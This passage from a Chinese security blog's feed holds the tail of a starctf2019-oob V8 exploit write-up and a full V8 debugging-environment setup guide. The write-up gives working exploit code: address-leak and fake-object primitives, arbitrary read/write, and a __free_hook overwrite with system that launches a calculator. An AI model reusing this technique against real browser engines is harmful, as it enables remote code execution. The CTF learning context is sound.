class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();</span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;</span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将某个addr强制转换为object对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);</span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型，以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> fake_array = [</span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),</span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x40n</span> + <span class="number">0x10n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] leak from: 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(leak_data));</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64_dataview</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setFloat64(<span class="number">0</span>, i2f(data), <span class="literal">true</span>);</span><br><span class="line">   <span class="comment">// %SystemBreak();</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;[*] write to : 0x&quot;</span> +hex(addr) + <span class="string">&quot;: 0x&quot;</span> + hex(data));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> code_addr = read64(addressOf(a.constructor) + <span class="number">0x30n</span>);</span><br><span class="line"><span class="keyword">var</span> leak_d8_addr = read64(code_addr + <span class="number">0x41n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc leak_d8_addr: 0x&quot;</span> + hex(leak_d8_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> d8_base_addr = leak_d8_addr -<span class="number">0xfc8780n</span>;<span class="comment">//本人的libc版本是libc-2.31.so，具体的偏移需要根据自己的libc版本来确定</span></span><br><span class="line"><span class="keyword">var</span> d8_got_libc_start_main_addr = d8_base_addr + <span class="number">0x12a47b0n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> libc_start_main_addr = read64(d8_got_libc_start_main_addr);</span><br><span class="line"><span class="keyword">var</span> libc_base_addr = libc_start_main_addr - <span class="number">0x26fc0n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_system_addr = libc_base_addr + <span class="number">0x55410n</span>;</span><br><span class="line"><span class="keyword">var</span> libc_free_hook_addr = libc_base_addr + <span class="number">0x00000000001EEB28n</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] find libc libc_free_hook_addr: 0x&quot;</span> + hex(libc_free_hook_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//write64(libc_free_hook_addr, libc_system_addr);</span></span><br><span class="line">write64_dataview(libc_free_hook_addr, libc_system_addr);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] Write ok.&quot;</span>);</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">let</span> get_shell_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">let</span> get_shell_dataview = <span class="keyword">new</span> <span class="built_in">DataView</span>(get_shell_buffer);</span><br><span class="line">    <span class="comment">//get_shell_dataview.setFloat64(0, i2f(0x0068732f6e69622fn)); // str --&gt; /bin/sh\x00</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">0</span>, i2f(<span class="number">0x69622fn</span>), <span class="literal">true</span>); <span class="comment">// /snap/bi</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">3</span>, i2f(<span class="number">0x2d656d6f6e672f6en</span>), <span class="literal">true</span>); <span class="comment">// n/gnome-</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">11</span>, i2f(<span class="number">0x74616c75636c6163n</span>), <span class="literal">true</span>); <span class="comment">// calculat</span></span><br><span class="line">    get_shell_dataview.setFloat64(<span class="number">19</span>, i2f(<span class="number">0x726fn</span>), <span class="literal">true</span>); <span class="comment">// or</span></span><br><span class="line">&#125;</span><br><span class="line">get_shell();</span><br></pre></td></tr></table></figure><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a class="link"   href="https://www.freebuf.com/news/203721.html" >https://www.freebuf.com/news/203721.html<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;starctf2019-oob&quot;&gt;&lt;a href=&quot;#starctf2019-oob&quot; class=&quot;headerlink&quot; title=&quot;starctf2019-oob&quot;&gt;&lt;/a&gt;starctf2019-oob&lt;/h1&gt;&lt;h2 id=&quot;1、环境复现&quot;&gt;&lt;a hr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>v8调试环境搭建及简单介绍</title>
    <link href="https://fa1lr4in.github.io/2021/04/20/v8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/"/>
    <id>https://fa1lr4in.github.io/2021/04/20/v8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/</id>
    <published>2021-04-20T09:57:29.000Z</published>
    <updated>2021-04-28T03:15:29.280Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ubuntu-v8调试环境搭建"><a href="#ubuntu-v8调试环境搭建" class="headerlink" title="ubuntu v8调试环境搭建"></a>ubuntu v8调试环境搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇文章的环境为ubuntu1804，写这篇文章的目的就是从一个初学者的角度来总结下环境搭建的流程，方便在其他机器搭建调试环境时省一些不必要的力气。我会尽量简洁明了的描述这个环境搭建流程，让我们开始吧。</p><p>首先分享下个人目录结构如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~<span class="comment"># ls</span></span><br><span class="line">tools  v8  桌面</span><br><span class="line">root@ubuntu:~<span class="comment"># ls tools/</span></span><br><span class="line">depot_tools  ninja  Trojan-Qt5-Linux.AppImage</span><br><span class="line">root@ubuntu:~<span class="comment"># ls  v8/</span></span><br><span class="line">v8</span><br><span class="line">root@ubuntu:~<span class="comment"># ls v8/v8/</span></span><br><span class="line">AUTHORS   build_overrides      COMMON_OWNERS  docs               infra         LICENSE.fdlibm      out         PRESUBMIT.py  samples  third_party</span><br><span class="line">base      buildtools           custom_deps    ENG_REVIEW_OWNERS  INFRA_OWNERS  LICENSE.strongtalk  out.gn      README.md     src      tools</span><br><span class="line">build     CODE_OF_CONDUCT.md   DEPS           gni                INTL_OWNERS   LICENSE.v8          OWNERS      RISCV_OWNERS  <span class="built_in">test</span>     WATCHLISTS</span><br><span class="line">BUILD.gn  codereview.settings  DIR_METADATA   include            LICENSE       MIPS_OWNERS         PPC_OWNERS  S390_OWNERS   testing</span><br></pre></td></tr></table></figure><p>tools里面配置了各个工具，包括depot_tools，ninja等</p><p>v8是v8项目的目录，我直接在/root/v8中进行fetch v8</p><p>安装v8一需要google的depot_tools工具，二需要一款稳定的代理</p><p>下面的代码中，如果上面是vi命令，下面注释的部分就是在vi的文件中要修改的部分</p><h2 id="Ubuntu环境配置"><a href="#Ubuntu环境配置" class="headerlink" title="Ubuntu环境配置"></a>Ubuntu环境配置</h2><p>1、允许root登录并进行ubuntu初始修改</p><p>2、配置linux全局代理，使终端可以访问墙外的v8编译相关资源</p><p>比如qv2ray，相关链接：<a class="link"   href="https://www.zsxcool.com/7137.html" >https://www.zsxcool.com/7137.html<i class="fas fa-external-link-alt"></i></a></p><p>再比如Trojan-QT5，相关链接：<a class="link"   href="https://github.com/Shadowsocks-Wiki/shadowsocks/blob/master/zh_CN/trojan/ubuntu-trojan-qt5-setup-guide.md" >https://github.com/Shadowsocks-Wiki/shadowsocks/blob/master/zh_CN/trojan/ubuntu-trojan-qt5-setup-guide.md<i class="fas fa-external-link-alt"></i></a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd root</span><br><span class="line">cp /home/ubuntu/.bashrc /root/</span><br><span class="line">apt update &amp;&amp; apt install ssh vim python python2.7 git libproxy-tools</span><br><span class="line">vi /etc/ssh/sshd_config<span class="comment">#修改 PermitRootLogin yes</span></span><br><span class="line">vi /etc/pam.d/gdm-autologin<span class="comment">#注释auth   required        pam_succeed_if.so user != root quiet_success</span></span><br><span class="line">vi /etc/pam.d/gdm-password<span class="comment">#注释auth   required        pam_succeed_if.so user != root quiet_success</span></span><br><span class="line">vi /root/.profile    <span class="comment">#改成 tty -s &amp;&amp; mesg n || true</span></span><br><span class="line">ln -s /usr/bin/python2 /usr/bin/python</span><br><span class="line">vi /root/.gitconfig</span><br><span class="line"><span class="comment">#[http]</span></span><br><span class="line"><span class="comment">#       proxy = http://127.0.0.1:58591#socks5://127.0.0.1:51837</span></span><br><span class="line"><span class="comment">#[https]</span></span><br><span class="line"><span class="comment">#       proxy = http://127.0.0.1:58591</span></span><br><span class="line">vi /etc/profile</span><br><span class="line"><span class="comment">#export http_proxy=&quot;http://127.0.0.1:58591&quot;</span></span><br><span class="line"><span class="comment">#export sock5_proxy=&quot;sock5://127.0.0.1:51837&quot;</span></span><br><span class="line">vi ~/.bashrc或者vi ~/.zshrc</span><br><span class="line"><span class="comment">#export http_proxy=&quot;http://127.0.0.1:58591&quot;</span></span><br><span class="line"><span class="comment">#export sock5_proxy=&quot;sock5://127.0.0.1:51837&quot;</span></span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc或者<span class="built_in">source</span> ~/.zshrc</span><br></pre></td></tr></table></figure><h2 id="v8环境配置"><a href="#v8环境配置" class="headerlink" title="v8环境配置"></a>v8环境配置</h2><p>下载depot_tools，v8并进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/tools/depot_tools</span><br><span class="line">git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git /root/tools/depot_tools</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; /etc/profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/root/tools/depot_tools&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line">apt install re2c g++</span><br><span class="line"><span class="built_in">cd</span> /root/tools</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ninja-build/ninja.git</span><br><span class="line"><span class="built_in">cd</span> ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; <span class="built_in">cd</span> ..</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/root/tools/ninja&quot;&#x27;</span> &gt;&gt; /etc/profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export PATH=$PATH:&quot;/root/tools/ninja&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line">mkdir /root/tools/.boto</span><br><span class="line">vi .boto</span><br><span class="line"><span class="comment">#[Boto]</span></span><br><span class="line"><span class="comment">#debug = 0</span></span><br><span class="line"><span class="comment">#num_retries = 10</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#proxy = 127.0.0.1</span></span><br><span class="line"><span class="comment">#proxy_port = 58591</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export NO_AUTH_BOTO_CONFIG=&quot;/root/tools/.boto&quot;&#x27;</span> &gt;&gt; /etc/profile</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;export NO_AUTH_BOTO_CONFIG=&quot;/root/tools/.boto&quot;&#x27;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="built_in">source</span> ~/.bashrc或者<span class="built_in">source</span> ~/.zshrc</span><br><span class="line">mkdir /root/v8</span><br><span class="line"><span class="built_in">cd</span> /root/v8</span><br><span class="line">fetch v8   <span class="comment">#这个可能会花很长时间，取决于个人的网络环境，如果中断了则 gclient sync同步</span></span><br><span class="line"><span class="built_in">cd</span> v8</span><br><span class="line"><span class="comment">#git reset --hard [commit hash]#切换版本，后面跟上commit的hash值，可选</span></span><br><span class="line"><span class="comment">#gclient sync</span></span><br><span class="line">sudo ./build/install-build-deps.sh --no-chromeos-fonts<span class="comment">#在linux系统中这个命令是需要的</span></span><br><span class="line">git pull &amp;&amp; gclient sync  <span class="comment">#同步更新</span></span><br><span class="line">tools/dev/gm.py arm64.debug <span class="comment"># 编译 debug 版本编译的过程可能会花上比较长的时间</span></span><br><span class="line">tools/dev/gm.py ia32.debug </span><br><span class="line">tools/dev/gm.py x64.debug </span><br><span class="line">tools/dev/gm.py arm.debug </span><br><span class="line">tools/dev/gm.py x64.release <span class="comment"># 编译 release 版本</span></span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a class="link"   href="https://bbs.pediy.com/thread-252812-1.htm" >https://bbs.pediy.com/thread-252812-1.htm<i class="fas fa-external-link-alt"></i></a></p><p><a href="browser-pwn-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.pdf">browser-pwn-基础知识.pdf</a> </p><p><a class="link"   href="https://7o8v.me/2019/10/30/V8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/" >https://7o8v.me/2019/10/30/V8%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/<i class="fas fa-external-link-alt"></i></a></p><h3 id="过程中遇到的问题"><a href="#过程中遇到的问题" class="headerlink" title="过程中遇到的问题"></a>过程中遇到的问题</h3><p>1、running depot tools as root is sad</p><p>进入到depot_tools目录，vim update_depot_tools 文件，注释掉</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="string">&quot;<span class="variable">$USER</span>&quot;</span> == <span class="string">&quot;root&quot;</span>)</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">  <span class="built_in">echo</span> running depot tools as root is sad </span><br><span class="line">  <span class="built_in">exit</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p>2、遇到 NOTICE: You have PROXY values set in your environment, but gsutilin depot_tools does not (yet) obey them.<br>Also, –no_auth prevents the normal BOTO_CONFIG environmentvariable from being used.<br>To use a proxy in this situation, please supply those settingsin a .boto file pointed to by the NO_AUTH_BOTO_CONFIG environmentvariable.</p><p>缺少代理的环境变量，首先新建一个<code>.boto</code>的文件，比方说放到<code>/home/[user]/.boto</code>（当然，user改成你的用户名），里面写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[Boto]``debug ``=` `0``num_retries ``=` `10` `proxy ``=` `[proxy ip]``proxy_port ``=` `[proxy port]</span><br></pre></td></tr></table></figure><p>其中IP和port改成自己的http代理，跟前面的同理。</p><p>然后在<code>~/.bashrc</code>最后面加上<code>export NO_AUTH_BOTO_CONFIG=&quot;/home/[user]/.boto&quot;</code>，然后重启一下bash或者<code>source ~/.bashrc</code>加载环境变量。</p><p>3、Failed to download <a class="link"   href="https://commondatastorage.googleapis.com/chrome-linux-sysroot/toolchain/43a87bbebccad99325fdcf34166295b121ee15c7/debian_sid_amd64_sysroot.tar.xz" >https://commondatastorage.googleapis.com/chrome-linux-sysroot/toolchain/43a87bbebccad99325fdcf34166295b121ee15c7/debian_sid_amd64_sysroot.tar.xz<i class="fas fa-external-link-alt"></i></a><br>Error: Command ‘vpython build/linux/sysroot_scripts/install-sysroot.py –arch=x64’ returned non-zero exit status 1 in /root/v8/v8</p><p>出现这种问题是因为网络原因，可以重新进行gclient sync或更换代理服务器</p><h2 id="turbolizer环境配置"><a href="#turbolizer环境配置" class="headerlink" title="turbolizer环境配置"></a>turbolizer环境配置</h2><p>首先，Ubuntu下默认的apt里面的nodejs不好使，必须得<a class="link"   href="https://tecadmin.net/install-latest-nodejs-npm-on-ubuntu/" >安装最新版的<i class="fas fa-external-link-alt"></i></a>：</p><p>不需要再安装github v8 tools里面的turbolizer，因为编译完成v8之后，tools文件夹中已经有相应的工具，不过也可以自行安装</p><p><del>然后安装并启动turbolizer，turbolizer项目地址：<a class="link"   href="https://github.com/v8/tools" >https://github.com/v8/tools<i class="fas fa-external-link-alt"></i></a></del></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd v8/tools/turbolizer</span><br><span class="line">npm i</span><br><span class="line">npm run-script build</span><br><span class="line">python -m SimpleHTTPServer 8001</span><br></pre></td></tr></table></figure><p>接着用chrome浏览器访问<code>ip:8001</code>就能用了，这时访问是没有数据的，我们需要生成json格式的过程文件，命令如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./d8 test_jscode/d8_poc.js --allow-natives-syntax --trace-turbo</span><br></pre></td></tr></table></figure><p>执行后就可以生成相应的json文件。</p><h2 id="v8调试"><a href="#v8调试" class="headerlink" title="v8调试"></a>v8调试</h2><h3 id="配置pip国内源以及pwndbg"><a href="#配置pip国内源以及pwndbg" class="headerlink" title="配置pip国内源以及pwndbg"></a>配置pip国内源以及pwndbg</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip</span><br><span class="line">vi ~/.pip/pip.conf</span><br><span class="line"><span class="comment">#[global]</span></span><br><span class="line"><span class="comment">#index-url = https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="built_in">cd</span> /root/tools</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh<span class="comment">#如果安装过程中哪步卡住或失败，可以手动执行命令，并将命令对应的行注释</span></span><br><span class="line">vi  ~/.gdbinit<span class="comment">#该文件中存放gdb初始运行前要执行的命令</span></span><br><span class="line"><span class="comment">#添加一行指令，该指令可以可视化的显示</span></span><br><span class="line"><span class="built_in">source</span> /root/v8/v8/tools/gdbinit<span class="comment">#指定的文件在v8目录下的tools/gdbinit</span></span><br></pre></td></tr></table></figure><h3 id="v8简单调试技巧"><a href="#v8简单调试技巧" class="headerlink" title="v8简单调试技巧"></a>v8简单调试技巧</h3><p>gdb调试支持如下：<a class="link"   href="https://gist.github.com/totherik/3a4432f26eea1224ceeb" >https://gist.github.com/totherik/3a4432f26eea1224ceeb<i class="fas fa-external-link-alt"></i></a></p><p>1、创建test_jscode/hello.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>,<span class="number">1.1</span>];</span><br><span class="line">%DebugPrint(a);<span class="comment">//输出a对象的结构</span></span><br><span class="line">%SystemBreak();<span class="comment">//下断点</span></span><br></pre></td></tr></table></figure><p>2、打开gdb并指定选项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb d8</span><br><span class="line"><span class="built_in">set</span> args --allow-natives-syntax test_jscode/hello.js</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p>部分执行结果如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/v8/v8/out/x64.debug# gdb d8</span><br><span class="line">...</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test_jscode/hello.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">...</span><br><span class="line">[New Thread 0x7f821b8f4700 (LWP 2844)]</span><br><span class="line">[New Thread 0x7f821b0f3700 (LWP 2845)]</span><br><span class="line">[New Thread 0x7f821a8f2700 (LWP 2846)]</span><br><span class="line">DebugPrint: 0x103408148989: [JSArray]</span><br><span class="line"> - map: 0x103408303ae1 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1034082cbba1 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x103408148961 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEM                                                                                                ENTS]</span><br><span class="line"> - length: 4</span><br><span class="line"> - properties: 0x10340804222d &lt;FixedArray[0]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    0x1034080446d5: [String] in ReadOnlySpace: #length: 0x10340824215                                                                                                d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x103408148961 &lt;FixedDoubleArray[4]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line">           3: 1.1</span><br><span class="line"> &#125;</span><br><span class="line">...</span><br><span class="line">──────────────────────────────[ STACK ]──────────────────────────────</span><br><span class="line">00:0000│ rbp rsp 0x7ffcdedd2030 —▸ 0x7ffcdedd20a0 —▸ 0x7ffcdedd2110 —                                                                                                ▸ 0x7ffcdedd2130 —▸ 0x7ffcdedd2170 ◂— ...</span><br><span class="line">01:0008│         0x7ffcdedd2038 —▸ 0x7f82206bd23d ◂— mov    rsi, qwor                                                                                                d ptr [rbp - 0x20]</span><br><span class="line">02:0010│         0x7ffcdedd2040 ◂— 0x100103400000000</span><br><span class="line">03:0018│         0x7ffcdedd2048 —▸ 0x7f821e7dcd63 ◂— &#x27;length_ &gt;= 0&#x27;</span><br><span class="line">04:0020│         0x7ffcdedd2050 ◂— 0x21643d78 /* &#x27;x=d!&#x27; */</span><br><span class="line">05:0028│         0x7ffcdedd2058 ◂— 0x0</span><br><span class="line">06:0030│         0x7ffcdedd2060 ◂— 0x0</span><br><span class="line">07:0038│         0x7ffcdedd2068 —▸ 0x103400000000 —▸ 0x7ffcdedd3a98 ◂                                                                                                — 0x103400000000</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>3、可以用job和telescope查看具体的数据结构或者数据的详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 